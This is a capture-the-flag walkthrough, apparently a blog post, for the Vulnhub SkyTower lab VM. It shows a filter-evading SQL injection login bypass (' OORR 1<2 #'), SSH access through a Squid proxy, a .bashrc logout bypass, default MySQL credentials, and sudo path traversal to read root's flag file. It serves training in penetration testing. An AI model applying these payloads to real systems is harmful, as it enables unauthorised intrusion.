## Description
[Vulnhub - SkyTower.](https://www.vulnhub.com/entry/skytower-1,96/) Welcome to SkyTower:1
This CTF was designed by Telspace Systems for the CTF at the ITWeb Security Summit and BSidesCPT (Cape Town). The aim is to test intermediate to advanced security enthusiasts in their ability to attack a system using a multi-faceted approach and obtain the "flag".

You will require skills across different facets of system and application vulnerabilities, as well as an understanding of various services and how to attack them. Most of all, your logical thinking and methodical approach to penetration testing will come into play to allow you to successfully attack this system. Try different variations and approaches. You will most likely find that automated tools will not assist you.

We encourage you to try it our for yourself first, give yourself plenty of time and then only revert to the Walkthroughs below.

Enjoy!

## Enumeration

Start by enumerating the open ports.
    
### Nmap
```
Nmap scan report for skytower.com (192.168.100.3)
Host is up, received arp-response (0.00074s latency).
Scanned at 2020-05-01 10:17:16 EDT for 33s
Not shown: 997 closed ports
Reason: 997 resets
PORT     STATE    SERVICE    REASON         VERSION
22/tcp   filtered ssh        no-response
80/tcp   open     http       syn-ack ttl 64 Apache httpd 2.2.22 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Site doesn't have a title (text/html).
3128/tcp open     http-proxy syn-ack ttl 64 Squid http proxy 3.1.20
|_http-server-header: squid/3.1.20
|_http-title: ERROR: The requested URL could not be retrieved
```

On opening port 80 in a web browser, we are presented with a login screen.

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhubimg/skytower/web.png){: .align-center}

Some initial tests shows that the website is vulnerable to `sql injection`

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhubimg/skytower/sql.png){: .align-center}

Let's do some additional tests using `burpsuite` and see if we can bypass the login using `' OR 1=1 #`.

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhubimg/skytower/burp.png){: .align-center}

We can see that the application is blocking some keywords like `OR`, `AND` and `=`.

On further inspection, we can see that the application filters out the keywords just once. We can bypass the filtering for `OR` by using `OORR`. This way, when the system filters out the `OR` in the middle , we still get the `OR` keyword. `1=1` can be substituted by `1<2`. Our payload for login bypass will be `' OORR 1<2 #`

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhubimg/skytower/sol.png){: .align-center}

And we have successfully bypassed the login page and we are presented with some `ssh` credentials. However there is no `ssh` port open on the system.

## Low Shell

### Proxychains

There is a `squid` server running on port `3128`. We can try redirecting our traffic using this to proxy to login to `ssh`.

Add the `squid` proxy in the `conf` file.

```bash
kali@kali:~$ tail /etc/proxychains.conf 
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
http 192.168.100.4 3128
```

Connect to `ssh` via proxy.

```bash
kali@kali:~$ proxychains ssh john@192.168.100.4

```

We successfully connected to `ssh` but we are immediately kicked of after printing the message `Funds have been withdrawn`.
This is probably because of an entry in `.bashrc` file. We can get a shell by appending `/bin/bash` at the end of the `ssh` command. This ensures that our command is executed before we are kicked out. Rename the `.bashrc` file after getting the shell and then login again.

```bash
kali@kali:~$ proxychains ssh john@192.168.100.3 /bin/bash

## Privilege Escalation

Download the Linux Enumeration script to the system and run it to probe for system weaknesses. 

### MySql
The script found that `MySql` has default credentials `root/root`. Login to `MySql` and dump the database.

```bash
john@SkyTower:~$ mysql -h localhost -u root -p
Enter password:

We have some credentials here. Let's see if we can `ssh` using these.

```bash
kali@kali:~$ proxychains ssh sara@192.168.100.4

```

We can, but we are kicked out after login. Do the same we did for `john` with the `.bashrc` file and re-login.
```bash
kali@kali:~$ proxychains ssh sara@192.168.100.4
ProxyChains-3.1 (http://proxychains.sf.net)

sara@SkyTower:~$ id
uid=1001(sara) gid=1001(sara) groups=1001(sara)
sara@SkyTower:~$ 
```

Check if the user has any `sudo` permissions.

```bash
sara@SkyTower:~$ sudo -l
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
sara@SkyTower:~$ 
```

We can run `sudo /bin/cat /accounts/*` and `sudo /bin/ls /accounts/*`. But how can we escalate privilege using these?. All we can do is view the files in `/accounts/` folder. And there is nothing in that folder. 

After racking my brain for some time, I found a rather simple solution. According to the `sudo` requirement, our command should start with `sudo /bin/ls /accounts/*`. What will happen if we try navigating to other folders using `\..\`. 

```bash
sara@SkyTower:/accounts$ sudo /bin/ls /accounts/../
accounts  bin  boot  dev  etc  home  initrd.img  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  selinux  srv  sys  tmp  usr  var  vmlinuz
sara@SkyTower:/accounts$ sudo /bin/ls /accounts/../root/
flag.txt
sara@SkyTower:/accounts$ sudo /bin/cat /accounts/../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
```
It WORKS! and the `root` password is in there.

## Root Shell

Login using the credentials we got from the flag file.

```bash
kali@kali:~$ proxychains ssh root@192.168.100.3
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-192.168.100.3:3128-<><>-192.168.100.3:22-<><>-OK
root@192.168.100.3's password:

And we are root.
